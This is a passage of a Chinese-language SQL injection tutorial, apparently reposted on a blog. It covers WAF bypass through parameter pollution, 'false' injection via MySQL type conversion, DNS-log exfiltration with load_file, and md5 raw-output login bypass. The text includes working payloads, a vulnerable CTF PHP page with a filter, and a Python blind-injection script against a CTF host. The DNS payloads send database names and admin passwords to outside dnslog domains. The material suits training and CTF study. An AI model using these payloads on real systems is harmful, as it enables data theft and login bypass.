服务器</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET[‘a’]</td><td>Last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(‘a’)</td><td>First</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(‘a’)</td><td>First</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(‘a’)</td><td>All</td></tr><tr><td>ASP&#x2F;IIS</td><td>Request.QueryString(‘a’)</td><td>All</td></tr></tbody></table><p>假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP&#x2F;Tomcat型服务器，第二部分是Apache为引擎的PHP&#x2F;Apache型服务器。第一部分的JSP&#x2F;Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP&#x2F;Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP&#x2F;Tomcat服务器，然后JSP&#x2F;Tomcat服务器再向PHP&#x2F;Apache服务器请求数据。数据返回路径则相反。</p><p>那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.jsp?<span class="built_in">id</span>=1&amp;<span class="built_in">id</span>=2</span><br></pre></td></tr></table></figure><p>客户端请求首先过JSP&#x2F;Tomcat服务器，JSP&#x2F;Tomcat服务器解析第一个参数，接下来JSP&#x2F;Tomcat服务器去请求PHP&#x2F;Apache服务器，PHP&#x2F;Apache服务器解析最后一个参数。假设JSP&#x2F;Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.jsp?<span class="built_in">id</span>=1&amp;<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><p>这样 Waf 可能只检测第一个参数 id&#x3D;1，而PHP脚本真正识别的是 id&#x3D;select database()–+<br>[例题]Sql-Labs Less-29</p><h3 id="False-注入绕过"><a href="#False-注入绕过" class="headerlink" title="False 注入绕过"></a>False 注入绕过</h3><p><strong>False 注入原理</strong><br>前面我们学过的注入都是基于1&#x3D;1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。</p><p>首先我们来看一看下面这个sql查询语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> uesrname = 0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png"></p><p>为什么 username &#x3D; 0 会导致返回数据，而且是全部数据呢？</p><p>这就是一个基于 False 注入的例子，下面再举一个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username = 0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png"></p><p>和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。</p><p>MYSQL 的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后0 &#x3D; 0 返回的是 True ，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd 字段中有一个值是以数字1开头的并非为0，再进行 passwd &#x3D; 0 比较时，会从1开始截断，1 &#x3D; 0 不成立，当然就只返回两条数据了。这就是 MYSQL False 注入的原理。</p><p><strong>False 注入利用</strong><br>下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username =<span class="string">&#x27;.$username.&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的利用点？</p><p>可以使用的姿势有很多，比如下面的算数运算：</p><ul><li>利用算数运算<br>加：+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;+&#x27;</span>, 拼接的语句: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>+<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>减：-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;-&#x27;</span>, 拼接的语句: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>-<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>乘：*</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;*&#x27;</span>, 拼接的语句: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>*<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>除：&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;/6#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;/6#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>取余：%</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;%1#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;%1#&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>利用位操作运算<br>我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。<br>和运算：&amp;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;&amp;0#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;&amp;0#&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>或运算：|</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;|0#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;|0#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>异或运算：^</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;^0#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;^0#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>移位操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;&lt;&lt;0# 或 &#x27;</span>&gt;&gt;0<span class="comment">#, 拼接的语句: </span></span><br><span class="line">select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>&lt;&lt;<span class="string">0#&#x27;;</span></span><br><span class="line"><span class="string">select * from user where username =&#x27;&#x27;&gt;&gt;0</span><span class="comment">#&#x27;;  </span></span><br></pre></td></tr></table></figure><ul><li>利用比较运算符<br>安全等于：&lt;&#x3D;&gt;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;=0&lt;=&gt;1# 拼接的语句：where username=&#x27;</span><span class="string">&#x27;=0&lt;=&gt;1#&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p>不等于&lt;&gt;(!&#x3D;)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;=0&lt;&gt;0# 拼接的语句：where username=&#x27;</span><span class="string">&#x27;=0&lt;&gt;0#&#x27;</span></span><br></pre></td></tr></table></figure><p>大小于&gt;或&lt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;-1# 拼接的语句：where username=&#x27;</span><span class="string">&#x27;&gt;-1#</span></span><br></pre></td></tr></table></figure><ul><li><p>其他</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+1 is not null<span class="comment">#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span></span><br></pre></td></tr></table></figure></li><li><p>综合利用<br>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p></li></ul><p>这里举例一道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);  </span><br><span class="line"><span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span>(<span class="params"><span class="variable">$lenth</span>=<span class="number">32</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$strBase</span> = <span class="string">&quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line">     <span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">     <span class="keyword">while</span>(<span class="variable">$lenth</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$strBase</span>,<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$strBase</span>)-<span class="number">1</span>),<span class="number">1</span>);</span><br><span class="line">       <span class="variable">$lenth</span> --;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$install</span>)&#123;</span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">        <span class="variable">$sql</span>  = <span class="string">&quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">randStr</span>()).<span class="string">&quot;&#x27;,&#x27;admin&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t input this illegal char!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select role from `user` where username =&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span> is &quot;</span>.<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t have this user!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">     <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">     <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$username</span>));</span><br><span class="line">     <span class="variable">$passwd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$passwd</span>));</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t login this as admin!&quot;</span>);</span><br><span class="line">     &#125;  </span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where username=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and passwd=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$passwd</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">     <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) <span class="keyword">exit</span>(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;sorry,username or passwd error!&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$passwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]):<span class="string">&quot;source&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;source&quot;</span>: <span class="title function_ invoke__">source</span>(); <span class="keyword">break</span> ;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;login&quot;</span> : <span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$passwd</span>);<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;show&quot;</span> : <span class="title function_ invoke__">show</span>(<span class="variable">$username</span>);<span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到filter()函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.urldecode(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p><p>可以在show函数利用查询的时候注入，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span></span><br></pre></td></tr></table></figure><p>这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以</p><p>异或会使字符串都转为浮点型，都变为了0，由于0&#x3D;0^0 -&gt; 1^0 -&gt; 1 当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’+’、’^’、’&#x2F;4#’ 这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p><p><strong>盲注脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopkrstuvwxyz&quot;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">str</span>+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = <span class="built_in">str</span>+flag</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h3><p><strong>原理</strong><br>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。</p><p>在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。</p><p>LOAD_FILE() 读取文件的函数<br>读取文件并返回文件内容为字符串。</p><p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p>注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv&#x3D;</p><p><strong>DNSLOG平台</strong>:<br><a href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p><p><a href="https://log.咕.com/">https://log.xn--9tr.com/</a></p><p><strong>UNC路径</strong><br>UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。</p><p>UNC路径的 格式 ：\server\sharename\directory\filename</p><p>等同于SELECT LOAD_FILE(‘&#x2F;&#x2F;库名.1806dl.dnslog.cn&#x2F;abc’</p><p>去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。</p><p>然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</p><p>payload示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>, database(),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>, (select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1 ),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>,(select column_name from information_schema.columns <span class="built_in">where</span> table_name=’admin’ and table_schema=database() <span class="built_in">limit</span> 2,1),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br><span class="line">?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&#x27;//&#x27;</span>,(select password from admin <span class="built_in">limit</span> 0,1),<span class="string">&#x27;.htleyd.dnslog.cn/abc&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="‘“-md5-pass-true-”‘-登录绕过"><a href="#‘“-md5-pass-true-”‘-登录绕过" class="headerlink" title="‘“.md5($pass,true).”‘ 登录绕过"></a>‘“.md5($pass,true).”‘ 登录绕过</h3><p>很多站点为了安全都会利用这样的语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE password = <span class="string">&#x27;.md5($password,true).&#x27;</span>;</span><br></pre></td></tr></table></figure><p>md5(string,true) 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c：<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png"></p><p>这不是普通的二进制字符串，而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种，这样的话就会和前面的形成闭合，构成万能密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE password = <span class="string">&#x27;&#x27;</span>or<span class="string">&#x27;6.......&#x27;</span></span><br></pre></td></tr></table></figure><p>但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？</p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于 password&#x3D;‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password&#x3D;‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）</p><p>接下来就是找到这样子的字符串，这里给出两个吧。</p><p>ffifdyop：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: <span class="string">&#x27;or&#x27;</span>6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: <span class="string">&#x27;or&#x27;</span>6]!r,b</span><br></pre></td></tr></table></figure><p>129581926211651571912466741651878684928：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo<span class="comment">#\xdf\xc1&#x27;or&#x27;8</span></span><br><span class="line">string: T0Do<span class="comment">#&#x27;or&#x27;8</span></span><br></pre></td></tr></table></figure><p>转载至  <a href="https://xz.aliyun.com/t/10594#toc-3">https://xz.aliyun.com/t/10594#toc-3</a></p>]]></content>
    
    
